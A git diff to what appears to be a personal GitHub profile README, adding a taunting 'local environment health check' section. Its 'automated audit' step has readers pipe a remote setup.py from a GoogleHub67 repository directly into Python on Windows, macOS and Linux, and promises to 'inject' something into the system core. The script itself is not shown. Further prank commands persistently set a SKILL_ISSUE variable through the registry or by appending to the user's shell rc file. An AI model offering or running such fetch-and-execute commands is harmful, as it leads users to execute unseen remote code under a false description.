@@ -266,6 +266,53 @@ Whatever you do, do not click the dropdown execution layer below unless you want
   </p>
 </details>
 
+### ⚙ Psychological Assessment & Local Environment Health Checks
+
+> [!CAUTION]
+> If you are still manually downloading software dependencies and clicking through forty layers of Windows or macOS nested menus just to update your system `PATH` variable in 2026, please seek administrative server help immediately. Leave the point-and-click adventure games to the front-end designers.
+
+Choose your compliance pathway below to evaluate your technical vulnerability.
+
+---
+
+## 🏎️ Pathway A: The Automated Audit (High Compliance)
+Run this single line to automatically detect your operating system archetype, audit your GUI dependence, and inject a localized environment reality check directly into your system core.
+
+### 🪟 Windows (PowerShell)
+```powershell
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
+```
+
+### 🍏 / 🐧 macOS & Linux (Terminal)
+```bash
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
+```
+
+---
+
+## 💤 Pathway B: The Manual Vector (Paranoid/Isolated)
+If you suffer from trust issues or are too lazy to open files and prefer to audit the payloads locally before executing your configuration realignment, evaluate your terminal environment using the manual strings below:
+
+### 🪟 Windows PowerShell 
+The gold standard for automated self-reflection. Run this to gracefully inject a reality check directly into your user environment scope:
+```powershell
+[Environment]::SetEnvironmentVariable("SKILL_ISSUE", $true, "User"); Write-Host "==================================================="; Write-Host "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED"; Write-Host "[!] CURRENT SKILL_ISSUE STATUS: $([Environment]::GetEnvironmentVariable('SKILL_ISSUE', 'User'))"; Write-Host "==================================================="; Write-Host "Congratulations. You successfully executed an environment scope modification because clicking via GUI was too hard."; Write-Host "Next time, try not to break your PATH configuration."
+```
+
+### 🖥️ Windows CMD (Command Prompt)
+If you refuse to leave the 1990s and prefer your automation served cold, force it straight into your registry to spawn a fresh diagnostic scope:
+```cmd
+REG ADD HKCU\Environment /v SKILL_ISSUE /t REG_SZ /d true /f && start cmd /v:on /k "echo =================================================== && echo [!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED && echo [!] CURRENT SKILL_ISSUE STATUS: true && echo =================================================== && echo Congratulations. You successfully restarted a window because clicking via GUI was too hard. && echo Next time, try not to break your PATH configuration." && exit
+```
+
+### 🐧 Unix Shells (Bash / Zsh)
+For the Linux gatekeepers and macOS purists who think using a terminal makes them an elite hacker. Permanent self-sabotage is just an append command away:
+```bash
+echo 'export SKILL_ISSUE="true"' >> ~/."$(basename "$SHELL")"rc && source ~/."$(basename "$SHELL")"rc && echo "===================================================" && echo "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED" && echo "[!] CURRENT SKILL_ISSUE STATUS: $SKILL_ISSUE" && echo "===================================================" && echo "Congratulations. You successfully appended a configuration file because clicking via GUI was too hard." && echo "Next time, try not to break your PATH configuration."
+```
+
+*Note: If any of these diagnostic indicators throw an unexpected system error, it only mathematically validates the evaluation.*
+
 ---
 
 <!-- =========================================================================
@@ -273,9 +320,6 @@ Whatever you do, do not click the dropdown execution layer below unless you want
      ========================================================================= -->
 ## 🛠️ Engineering Sandbox & Future Blueprints
 
-> [!TIP]
-> **DEPENDENCY MANAGEMENT PRO-TIP:** I use PowerShell tooling to manage my programming environments. If you are still manually downloading dependencies and setting system path variables by clicking through Windows menus in 2026, please seek administrative server help immediately.
-> `[Environment]::SetEnvironmentVariable("SKILL_ISSUE", $true, "User")`
 * **My Stack:** I write high-throughput scripts in Python, build experimental configurations in Scala, manage structural relational databases via DBeaver SQL, and optimize environments using PowerShell tooling (`pip` / `iex-irm` / `uv`).
 * **Automated Physical Chessboard:** I am architecting an automated, physical chess engine driven by a **Raspberry Pi (Zero W or 4)**. The system pulls live data over server APIs, actuates physical pieces under the board using micro-motors, and runs real-time hardware validation scripts to prevent illegal moves.
 * **Infinite Matrix Chess:** Fusing spatial coordinate structures from Math Olympiad with software engineering to write game engines that eliminate standard grid boundaries, translating traditional rule sets into infinite matrix grids.
@@ -730,7 +774,7 @@ May his soul rest in eternal peace. The chess community will forever remember hi
 > **POSIX COMPLIANCE NOTE FOR CASUALS:** If you are digging through this repository's source code and wondering why there is a blank line left at the absolute end of the file, it is because Git and POSIX standard compilers are notoriously stupid and throw runtime tantrums when a file lacks a trailing newline (`\n`). If you did not already know that a missing end-of-file newline breaks data line-parsing logic, congratulations—you are just as clueless as the system architecture you are using. To be fair, my past self used to omit this line all the time because I completely lacked the brains to realize why my diff branches were breaking. And yes, I actually hit Enter to create it this time, because otherwise I'd be the stupid one here.
 
 > [!TIP]
-> **SYSTEM COMPILATION COMPLETE:** If you actually scrolled through all ~750 lines of this ~42.5 KB data dump and read this far down, thank you for taking your time. Your dedication to reading text screens is highly optimal, and your attention span is officially superior to 99% of the internet. You may now safely log out of the mainframe.
+> **SYSTEM COMPILATION COMPLETE:** If you actually scrolled through all ~750 lines of this ~42.5 KB data dump and read this far down, thank you for taking your time. Your dedication to reading text screens is highly optimal, and your attention span is officially superior to 99.9% of the internet. You may now safely log out of the mainframe.
 
 ```text
 [FINAL_DIAGNOSTICS] -------------------------------------------------------
